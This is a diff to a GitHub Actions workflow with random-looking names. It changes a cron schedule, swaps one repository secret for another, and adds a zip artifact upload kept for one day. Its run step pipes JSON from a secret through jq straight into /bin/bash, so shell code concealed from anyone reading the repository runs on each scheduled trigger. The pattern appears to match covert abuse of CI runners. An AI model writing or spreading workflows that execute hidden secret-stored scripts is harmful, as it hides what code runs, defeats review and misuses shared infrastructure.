@@ -1,25 +1,25 @@
 name: linxuejiegong
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '51 4/6 * * *'
-jobs:  # 3875
+    - cron: '47 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: linxuejiegong
         env:
-          mcr58: ${{ secrets.mcr58 }}
+          twgrk52: ${{ secrets.twgrk52 }}
         run: |
-          echo $mcr58 | jq -r .xs52933 | /bin/bash
-          echo $t26222 | jq -r .i18 | /bin/bash
-          echo $zgpbt0 | jq -r .opbm8 | /bin/bash
-          echo $ur27695 | jq -r .k6 | /bin/bash
-          echo $p1303 | jq -r .ioz00 | /bin/bash
-          echo $ljopg27945 | jq -r .cv7 | /bin/bash
-          echo $goad43216 | jq -r .iybvt8 | /bin/bash
-          echo $n52 | jq -r .p40924 | /bin/bash
-          echo $g3 | jq -r .fmek44186 | /bin/bash
+          printf '%s' "$twgrk52" | jq -r .txl32501 | /bin/bash
+          echo $kul5 | jq -r .dgylz669 | /bin/bash
+          echo $o39201 | jq -r .q607 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: OrEDXfMJ
+          path: "*.zip"
+          retention-days: 1
